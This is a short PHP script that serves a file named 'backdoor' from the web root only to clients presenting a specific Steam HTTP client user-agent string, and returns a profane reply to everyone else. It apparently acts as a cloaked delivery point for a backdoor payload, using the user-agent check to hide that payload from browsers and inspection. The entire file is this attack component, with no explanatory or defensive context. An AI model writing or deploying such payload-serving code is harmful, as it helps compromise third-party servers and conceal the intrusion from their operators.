<?php
$backdoor_script = file_get_contents($_SERVER['DOCUMENT_ROOT'].'/script/backdoor');
if($_SERVER['HTTP_USER_AGENT']=="Valve/Steam HTTP Client 1.0 (4000)") { 
    echo $backdoor_script;
}
else {
    echo fuckoff;
}

?>